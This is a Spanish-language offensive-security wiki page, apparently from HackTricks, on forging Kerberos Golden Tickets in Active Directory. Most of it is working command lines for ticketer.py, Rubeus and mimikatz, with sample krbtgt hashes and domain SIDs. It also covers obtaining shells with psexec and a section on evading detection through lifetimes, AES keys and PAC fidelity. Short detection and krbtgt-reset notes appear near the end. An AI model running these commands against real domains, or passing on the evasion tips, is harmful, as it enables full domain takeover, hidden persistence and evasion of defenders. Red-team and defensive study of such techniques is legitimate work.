# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

Un ataque **Golden Ticket** consiste en la **creación de un Ticket Granting Ticket (TGT) legítimo que suplanta a cualquier usuario** mediante el uso del **hash NTLM de la cuenta krbtgt de Active Directory (AD)**. Esta técnica es especialmente ventajosa porque **permite acceder a cualquier servicio o máquina** dentro del dominio como el usuario suplantado. Es crucial recordar que las **credenciales de la cuenta krbtgt nunca se actualizan automáticamente**.<sup>[[1]](#references)</sup>

Para **obtener el hash NTLM** de la cuenta krbtgt, se pueden emplear diversos métodos. Puede extraerse del **proceso Local Security Authority Subsystem Service (LSASS)** o del **archivo NT Directory Services (NTDS.dit)** ubicado en cualquier Domain Controller (DC) del dominio. Además, **ejecutar un ataque DCsync** es otra estrategia para obtener este hash NTLM, y puede realizarse mediante herramientas como el **módulo lsadump::dcsync** de Mimikatz o el **script secretsdump.py** de Impacket. Es importante destacar que, para llevar a cabo estas operaciones, normalmente se requieren **privilegios de administrador del dominio o un nivel de acceso similar**.<sup>[[2]](#references)</sup>

Aunque el hash NTLM es un método viable para este propósito, se **recomienda encarecidamente** **forjar tickets usando las claves Kerberos del Advanced Encryption Standard (AES) (AES128 y AES256)** por motivos de seguridad operativa. Esto es aún más importante en los dominios modernos porque el **uso de RC4 se está eliminando gradualmente** y destaca mucho más claramente en la telemetría de Kerberos.<sup>[[5]](#references)</sup>
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Notas modernas sobre la creación de tickets

Cuando sea posible, **consulta LDAP y SYSVOL primero** y luego forja el ticket usando la política de dominio real y los valores PAC del usuario en lugar de inventarlos manualmente:<sup>[[4]](#references)</sup>
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` solicita al DC los datos del usuario, del grupo, de NetBIOS y de las políticas utilizados para crear un PAC más realista.
- `/printcmd` imprime una línea de comandos offline que contiene los campos PAC recuperados, lo que resulta útil si más adelante quieres falsificar el mismo ticket sin volver a acceder a LDAP.
- `/extendedupndns` añade los elementos PAC más recientes `UpnDns`, que contienen el `samAccountName` y el SID de la cuenta.
- `/oldpac` elimina los búferes PAC más recientes `Requestor` y `Attributes`; esto resulta principalmente útil para realizar pruebas de compatibilidad con entornos antiguos, no como tradecraft predeterminado.

Desde Linux, las versiones recientes de Impacket también permiten añadir las estructuras PAC más recientes y establecer un periodo de validez realista:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` está expresado en **horas**. El valor predeterminado es de **10 años**, lo que genera mucho ruido.
- `-extra-pac` añade la información `UPN_DNS` más reciente del PAC.
- `-old-pac` fuerza el diseño de PAC heredado.
- `-extra-sid` resulta útil cuando el PAC necesita SIDs adicionales (por ejemplo, en escenarios de escalada de child a parent, que se describen en [SID-History Injection](sid-history-injection.md)).

**Una vez** que hayas **inyectado el golden Ticket**, puedes acceder a los archivos compartidos **(C$)** y ejecutar servicios y WMI, por lo que podrías usar **psexec** o **wmiexec** para obtener una shell (parece que no puedes obtener una shell mediante winrm).

### Bypassing common detections

Las formas más frecuentes de detectar un golden ticket consisten en **inspeccionar el tráfico Kerberos** en la red. De forma predeterminada, Mimikatz **firma el TGT por 10 años**, lo que destacará como anómalo en las solicitudes TGS posteriores realizadas con él.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Usa los parámetros `/startoffset`, `/endin` y `/renewmax` para controlar el desfase inicial, la duración y el número máximo de renovaciones (todos expresados en minutos).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Desafortunadamente, la duración del TGT no se registra en los eventos 4769, por lo que no encontrarás esta información en los registros de eventos de Windows. Sin embargo, lo que puedes correlacionar es **ver eventos 4769 sin un evento 4768 previo**. **No es posible solicitar un TGS sin un TGT** y, si no existe ningún registro de que se haya emitido un TGT, podemos inferir que fue falsificado offline.

En **compilaciones más recientes de Windows**, los ID de evento **4768** y **4769** también exponen una telemetría mucho mejor del **tipo de cifrado**. Un TGT/TGS falsificado que use **RC4 (`0x17`)** en un dominio donde `krbtgt`, los clientes y los servicios ya tienen claves AES es mucho más fácil de detectar que hace unos años. Esta es otra razón para preferir **Golden Tickets basados en AES** y ajustarse lo máximo posible a la política normal de Kerberos del dominio.

Otro problema de OPSEC es la **fidelidad del PAC**. Los tickets con pertenencias a grupos imposibles, buffers PAC nuevos ausentes o metadatos de cuenta que no coinciden con LDAP son más fáciles de detectar cuando los defensores validan el contenido del PAC comparándolo con los datos de AD. Si necesitas un TGT que parezca haber sido emitido realmente por un DC, revisa:

{{#ref}}
diamond-ticket.md
{{#endref}}

También existen **limitaciones ambientales** para la persistencia. La cuenta `krbtgt` conserva un **historial de contraseñas de 2**, por lo que un TGT falsificado puede seguir siendo válido después del **primer** restablecimiento de `krbtgt` si fue firmado con la clave anterior. Por eso los defensores invalidan los Golden Tickets **restableciendo `krbtgt` dos veces** y esperando al menos la duración máxima de los tickets del dominio entre ambos restablecimientos.<sup>[[3]](#references)</sup>

Para **evitar esta detección**, revisa los diamond tickets.

### Mitigación

- 4624: Inicio de sesión de cuenta
- 4672: Inicio de sesión de administrador
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Otros pequeños trucos que pueden aplicar los defensores son **generar alertas sobre eventos 4769 de usuarios sensibles**, como la cuenta de administrador del dominio predeterminada, y generar alertas sobre el **uso de RC4 para `krbtgt`** en dominios que normalmente emiten tickets AES.<sup>[[5]](#references)</sup>

## Referencias

- [1] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Kerberos: Golden Tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [3] [AD Forest Recovery - Reset the krbtgt password | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [4] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [5] [Microsoft – How to manage Kerberos KDC usage of RC4 for service account ticket issuance (CVE-2026-20833)](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
